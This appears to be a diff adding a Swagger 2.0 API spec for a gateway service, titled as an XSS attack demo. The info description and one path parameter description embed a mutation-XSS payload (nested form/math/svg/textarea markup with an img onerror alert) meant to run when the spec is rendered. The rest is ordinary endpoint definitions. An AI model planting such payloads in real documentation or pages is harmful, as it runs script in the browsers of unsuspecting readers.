@@ -1,0 +1,1930 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY tambirmutee
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
+
+  version: production
+basePath: /comodifgateway
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+paths:
+  /tambirmutee:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - tambirmutee_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: deleteGroupById
+      summary: Deletes a group by id
+    get:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findGroupsById
+      summary: Finds groups by id
+    post:
+      parameters:
+        - description: Id value to filter by
+          in: path
+          name: id
+          required: true
+          type: string
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: 'You cannot create an LDAP group with a POST.  '
+      operationId: createGroupById
+      summary: Creates a new group by id
+    put:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: You cannot change information for an LDAP group with a PUT.
+      operationId: updateGroupById
+      summary: Updates an existing group by id
+  "/api/account":
+    get:
+      tags:
+      - account-resource
+      summary: getAccount
+      operationId: getAccountUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    post:
+      tags:
+      - account-resource
+      summary: saveAccount
+      operationId: saveAccountUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: userDTO
+        description: userDTO
+        required: true
+        schema:
+          "$ref": "#/definitions/UserDTO"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ResponseEntity"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/blink-password/user/{userId}/blink-seconds/{time}":
+    post:
+      tags:
+      - account-resource
+      summary: blinkPassword
+      operationId: blinkPasswordUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: userId
+        in: path
+        description: userId
+        required: true
+        type: integer
+        format: int64
+      - name: time
+        in: path
+        description: time
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ResponseEntity"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change-email-with-check":
+    post:
+      tags:
+      - account-resource
+      summary: changeEmailWithCheck
+      operationId: changeEmailWithCheckUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: emailCheckVM
+        description: emailCheckVM
+        required: true
+        schema:
+          "$ref": "#/definitions/EmailCheckVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ResponseEntity"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change-password":
+    post:
+      tags:
+      - account-resource
+      summary: changePassword
+      operationId: changePasswordUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: passwordVM
+        description: passwordVM
+        required: true
+        schema:
+          "$ref": "#/definitions/PasswordVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: object
+            additionalProperties:
+              type: string
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change-password-with-check":
+    post:
+      tags:
+      - account-resource
+      summary: changePasswordWithCheck
+      operationId: changePasswordWithCheckUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: passwordCheckVM
+        description: passwordCheckVM
+        required: true
+        schema:
+          "$ref": "#/definitions/PasswordCheckVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: object
+            additionalProperties:
+              type: string
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change-password-with-check/login/{login}":
+    post:
+      tags:
+      - account-resource
+      summary: changePasswordWithCheckOfUser
+      operationId: changePasswordWithCheckOfUserUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: passwordCheckVM
+        description: passwordCheckVM
+        required: true
+        schema:
+          "$ref": "#/definitions/PasswordCheckVM"
+      - name: login
+        in: path
+        description: login
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: object
+            additionalProperties:
+              type: string
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change-password/login/{login}":
+    post:
+      tags:
+      - account-resource
+      summary: changePasswordOfUser
+      operationId: changePasswordOfUserUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: passwordVM
+        description: passwordVM
+        required: true
+        schema:
+          "$ref": "#/definitions/PasswordVM"
+      - name: login
+        in: path
+        description: login
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: object
+            additionalProperties:
+              type: string
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/change_password_raw":
+    post:
+      tags:
+      - account-resource
+      summary: changePassword
+      operationId: changePasswordUsingPOST_1
+      consumes:
+      - application/json
+      produces:
+      - text/plain
+      parameters:
+      - in: body
+        name: password
+        description: password
+        required: true
+        schema:
+          type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ResponseEntity"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/account/switch-jwt":
+    post:
+      tags:
+      - account-resource
+      summary: switchJWT
+      operationId: switchJWTUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: switchJwtVM
+        description: switchJwtVM
+        required: true
+        schema:
+          "$ref": "#/definitions/SwitchJwtVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: string
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/activate":
+    get:
+      tags:
+      - account-resource
+      summary: activateAccount
+      operationId: activateAccountUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: key
+        in: query
+        description: key
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: string
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/auth":
+    post:
+      tags:
+      - user-jwt-controller
+      summary: auth
+      operationId: authUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: loginVM
+        description: loginVM
+        required: true
+        schema:
+          "$ref": "#/definitions/LoginVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/LoginResponseVM"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authenticate":
+    get:
+      tags:
+      - account-resource
+      summary: isAuthenticated
+      operationId: isAuthenticatedUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: string
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    post:
+      tags:
+      - user-jwt-controller
+      summary: authorize
+      operationId: authorizeUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: loginVM
+        description: loginVM
+        required: true
+        schema:
+          "$ref": "#/definitions/LoginVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ResponseEntity"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/authorities":
+    get:
+      tags:
+      - authority-resource
+      summary: getAllAuthorities
+      operationId: getAllAuthoritiesUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/AuthorityDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/role":
+    post:
+      tags:
+      - authority-resource
+      summary: addRole
+      operationId: addRoleUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: roleDTO
+        description: roleDTO
+        required: true
+        schema:
+          "$ref": "#/definitions/RoleDTO"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/RoleDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/role/auths":
+    get:
+      tags:
+      - authority-resource
+      summary: getRolesWithAuths
+      operationId: getRolesWithAuthsUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/RoleDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/role/{id}":
+    delete:
+      tags:
+      - authority-resource
+      summary: deleteRole
+      operationId: deleteRoleUsingDELETE
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+  "/api/authority/role/{roleId}/auths":
+    get:
+      tags:
+      - authority-resource
+      summary: getAuthsOfRole
+      operationId: getAuthsOfRoleUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: roleId
+        in: path
+        description: roleId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/AuthorityDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    post:
+      tags:
+      - authority-resource
+      summary: setAuthsOfRole
+      operationId: setAuthsOfRoleUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: roleId
+        in: path
+        description: roleId
+        required: true
+        type: integer
+        format: int64
+      - in: body
+        name: authorityVM
+        description: authorityVM
+        required: true
+        schema:
+          "$ref": "#/definitions/AuthorityVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/AuthorityDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/roles":
+    get:
+      tags:
+      - authority-resource
+      summary: getAllRoles
+      operationId: getAllRolesUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: page
+        in: query
+        description: Page number of the requested page
+        required: false
+        type: integer
+        format: int32
+      - name: size
+        in: query
+        description: Size of a page
+        required: false
+        type: integer
+        format: int32
+      - name: query
+        in: query
+        description: query
+        required: false
+        type: string
+      - name: sort
+        in: query
+        description: 'Sorting criteria in the format: property(,asc|desc). Default
+          sort order is ascending. Multiple sort criteria are supported.'
+        required: false
+        type: array
+        items:
+          type: string
+        collectionFormat: multi
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/RoleDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/roles/{id}":
+    get:
+      tags:
+      - authority-resource
+      summary: findRole
+      operationId: findRoleUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/RoleDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/user/{userId}/auths":
+    get:
+      tags:
+      - authority-resource
+      summary: getAuthsOfUser
+      operationId: getAuthsOfUserUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: userId
+        in: path
+        description: userId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/AuthorityDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/authority/user/{userId}/roles":
+    get:
+      tags:
+      - authority-resource
+      summary: getRolesOfUser
+      operationId: getRolesOfUserUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: userId
+        in: path
+        description: userId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/RoleDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/gateway/routes":
+    get:
+      tags:
+      - gateway-resource
+      summary: activeRoutes
+      operationId: activeRoutesUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/RouteVM"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/payloads":
+    get:
+      tags:
+      - payload-resource
+      summary: getAllPayloads
+      operationId: getAllPayloadsUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/PayloadDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    post:
+      tags:
+      - payload-resource
+      summary: createPayload
+      operationId: createPayloadUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: payloadDTO
+        description: payloadDTO
+        required: true
+        schema:
+          "$ref": "#/definitions/PayloadDTO"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/PayloadDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    put:
+      tags:
+      - payload-resource
+      summary: updatePayload
+      operationId: updatePayloadUsingPUT
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: payloadDTO
+        description: payloadDTO
+        required: true
+        schema:
+          "$ref": "#/definitions/PayloadDTO"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/PayloadDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/payloads/client/{clientId}":
+    get:
+      tags:
+      - payload-resource
+      summary: getPayloadByClientId
+      operationId: getPayloadByClientIdUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: clientId
+        in: path
+        description: clientId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/PayloadDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    delete:
+      tags:
+      - payload-resource
+      summary: deletePayloadByClientId
+      operationId: deletePayloadByClientIdUsingDELETE
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: clientId
+        in: path
+        description: clientId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+  "/api/payloads/user-type/{userType}/asset/{assetId}":
+    get:
+      tags:
+      - payload-resource
+      summary: getPayloadByUserTypeAndAssetId
+      operationId: getPayloadByUserTypeAndAssetIdUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: userType
+        in: path
+        description: userType
+        required: true
+        type: string
+      - name: assetId
+        in: path
+        description: assetId
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/PayloadDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/payloads/{id}":
+    get:
+      tags:
+      - payload-resource
+      summary: getPayload
+      operationId: getPayloadUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/PayloadDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    delete:
+      tags:
+      - payload-resource
+      summary: deletePayload
+      operationId: deletePayloadUsingDELETE
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+  "/api/profile-info":
+    get:
+      tags:
+      - profile-info-resource
+      summary: getActiveProfiles
+      operationId: getActiveProfilesUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/ProfileInfoVM"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users":
+    get:
+      tags:
+      - user-resource
+      summary: getAllUsers
+      operationId: getAllUsersUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: page
+        in: query
+        description: Page number of the requested page
+        required: false
+        type: integer
+        format: int32
+      - name: size
+        in: query
+        description: Size of a page
+        required: false
+        type: integer
+        format: int32
+      - name: query
+        in: query
+        description: query
+        required: false
+        type: string
+      - name: sort
+        in: query
+        description: 'Sorting criteria in the format: property(,asc|desc). Default
+          sort order is ascending. Multiple sort criteria are supported.'
+        required: false
+        type: array
+        items:
+          type: string
+        collectionFormat: multi
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    post:
+      tags:
+      - user-resource
+      summary: createUser
+      operationId: createUserUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: managedUserVM
+        description: managedUserVM
+        required: true
+        schema:
+          "$ref": "#/definitions/ManagedUserVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: integer
+            format: int64
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    put:
+      tags:
+      - user-resource
+      summary: updateUser
+      operationId: updateUserUsingPUT
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: managedUserVM
+        description: managedUserVM
+        required: true
+        schema:
+          "$ref": "#/definitions/ManagedUserVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/authorities":
+    get:
+      tags:
+      - user-resource
+      summary: getAuthorities
+      operationId: getAuthoritiesUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              type: string
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/count":
+    get:
+      tags:
+      - user-resource
+      summary: getCount
+      operationId: getCountUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: integer
+            format: int64
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/delete-with-assets/{id}":
+    delete:
+      tags:
+      - user-resource
+      summary: deleteUserWithAssets
+      operationId: deleteUserWithAssetsUsingDELETE
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+  "/api/users/email":
+    post:
+      tags:
+      - user-resource
+      summary: getUserByEmailNoPathVariable
+      operationId: getUserByEmailNoPathVariableUsingPOST
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - in: body
+        name: loginVM
+        description: loginVM
+        required: true
+        schema:
+          "$ref": "#/definitions/LoginVM"
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '201':
+          description: Created
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/email/{email}":
+    get:
+      tags:
+      - user-resource
+      summary: getUserByEmail
+      operationId: getUserByEmailUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: email
+        in: path
+        description: email
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/email/{email}/login/{login}":
+    get:
+      tags:
+      - user-resource
+      summary: getUserByEmailAndLogin
+      operationId: getUserByEmailAndLoginUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: email
+        in: path
+        description: email
+        required: true
+        type: string
+      - name: login
+        in: path
+        description: login
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/login/{login}":
+    get:
+      tags:
+      - user-resource
+      summary: getUser
+      operationId: getUserUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: login
+        in: path
+        description: login
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    delete:
+      tags:
+      - user-resource
+      summary: deleteUser
+      operationId: deleteUserUsingDELETE
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: login
+        in: path
+        description: login
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+  "/api/users/multiple/{userIds}":
+    get:
+      tags:
+      - user-resource
+      summary: getMultipleUsersById
+      operationId: getMultipleUsersByIdUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: userIds
+        in: path
+        description: userIds
+        required: true
+        type: string
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/role/{authorityName}":
+    get:
+      tags:
+      - user-resource
+      summary: getAllUsersByRole
+      operationId: getAllUsersByRoleUsingGET
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: page
+        in: query
+        description: Page number of the requested page
+        required: false
+        type: integer
+        format: int32
+      - name: size
+        in: query
+        description: Size of a page
+        required: false
+        type: integer
+        format: int32
+      - name: authorityName
+        in: path
+        description: authorityName
+        required: true
+        type: string
+      - name: sort
+        in: query
+        description: 'Sorting criteria in the format: property(,asc|desc). Default
+          sort order is ascending. Multiple sort criteria are supported.'
+        required: false
+        type: array
+        items:
+          type: string
+        collectionFormat: multi
+      responses:
+        '200':
+          description: OK
+          schema:
+            type: array
+            items:
+              "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+  "/api/users/{id}":
+    get:
+      tags:
+      - user-resource
+      summary: getPayload
+      operationId: getPayloadUsingGET_1
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+          schema:
+            "$ref": "#/definitions/UserDTO"
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+        '404':
+          description: Not Found
+    delete:
+      tags:
+      - user-resource
+      summary: deleteUser
+      operationId: deleteUserUsingDELETE_1
+      consumes:
+      - application/json
+      produces:
+      - "*/*"
+      parameters:
+      - name: id
+        in: path
+        description: id
+        required: true
+        type: integer
+        format: int64
+      responses:
+        '200':
+          description: OK
+        '204':
+          description: No Content
+        '401':
+          description: Unauthorized
+        '403':
+          description: Forbidden
+definitions:
+  RoleDTO:
+    type: object
+    properties:
+      authorities:
+        type: array
+        items:
+          "$ref": "#/definitions/AuthorityDTO"
+      id:
+        type: integer
+        format: int64
+      name:
+        type: string
+  LoginVM:
+    type: object
+    required:
+    - password
+    - username
+    properties:
+      password:
+        type: string
+      rememberMe:
+        type: boolean
+      username:
+        type: string
+        minLength: 1
+        maxLength: 50
+        pattern: "^[_'.@A-Za-z0-9-]*$"
+  ProfileInfoVM:
+    type: object
+    properties:
+      activeProfiles:
+        type: array
+        items:
+          type: string
+      ribbonEnv:
+        type: string
+  AuthorityVM:
+    type: object
+    properties:
+      authorityIds:
+        type: array
+        items:
+          type: integer
+          format: int64
+      role:
+        "$ref": "#/definitions/RoleDTO"
+  SwitchJwtVM:
+    type: object
+    properties:
+      assetId:
+        type: integer
+        format: int64
+      jwt:
+        type: string
+  PasswordVM:
+    type: object
+    properties:
+      password:
+        type: string
+  UserDTO:
+    type: object
+    properties:
+      activated:
+        type: boolean
+      authorities:
+        type: array
+        items:
+          type: string
+      authorityList:
+        type: array
+        items:
+          type: integer
+          format: int64
+      createdBy:
+        type: string
+      createdDate:
+        type: string
+        format: date-time
+      email:
+        type: string
+        minLength: 5
+        maxLength: 100
+      firstName:
+        type: string
+        minLength: 0
+        maxLength: 50
+      id:
+        type: integer
+        format: int64
+      imageUrl:
+        type: string
+        minLength: 0
+        maxLength: 256
+      langKey:
+        type: string
+        minLength: 2
+        maxLength: 5
+      lastModifiedBy:
+        type: string
+      lastModifiedDate:
+        type: string
+        format: date-time
+      lastName:
+        type: string
+        minLength: 0
+        maxLength: 50
+      login:
+        type: string
+        minLength: 1
+        maxLength: 50
+        pattern: "^[_'.@A-Za-z0-9-]*$"
+      resetKey:
+        type: string
+      roleList:
+        type: array
+        items:
+          type: integer
+          format: int64
+      roles:
+        type: array
+        items:
+          type: string
+  ServiceInstance:
+    type: object
+    properties:
+      host:
+        type: string
+      metadata:
+        type: object
+        additionalProperties:
+          type: string
+      port:
+        type: integer
+        format: int32
+      secure:
+        type: boolean
+      serviceId:
+        type: string
+      uri:
+        "$ref": "#/definitions/URI"
+  URI:
+    type: object
+    properties:
+      absolute:
+        type: boolean
+      authority:
+        type: string
+      fragment:
+        type: string
+      host:
+        type: string
+      opaque:
+        type: boolean
+      path:
+        type: string
+      port:
+        type: integer
+        format: int32
+      query:
+        type: string
+      rawAuthority:
+        type: string
+      rawFragment:
+        type: string
+      rawPath:
+        type: string
+      rawQuery:
+        type: string
+      rawSchemeSpecificPart:
+        type: string
+      rawUserInfo:
+        type: string
+      scheme:
+        type: string
+      schemeSpecificPart:
+        type: string
+      userInfo:
+        type: string
+  PayloadDTO:
+    type: object
+    properties:
+      assetId:
+        type: integer
+        format: int64
+      clientId:
+        type: integer
+        format: int64
+      id:
+        type: integer
+        format: int64
+      userId:
+        type: integer
+        format: int64
+      userType:
+        type: string
+  ManagedUserVM:
+    type: object
+    properties:
+      activated:
+        type: boolean
+      authorities:
+        type: array
+        items:
+          type: string
+      authorityList:
+        type: array
+        items:
+          type: integer
+          format: int64
+      createdBy:
+        type: string
+      createdDate:
+        type: string
+        format: date-time
+      email:
+        type: string
+        minLength: 5
+        maxLength: 100
+      encodedPassword:
+        type: string
+      firstName:
+        type: string
+        minLength: 0
+        maxLength: 50
+      id:
+        type: integer
+        format: int64
+      imageUrl:
+        type: string
+        minLength: 0
+        maxLength: 256
+      langKey:
+        type: string
+        minLength: 2
+        maxLength: 5
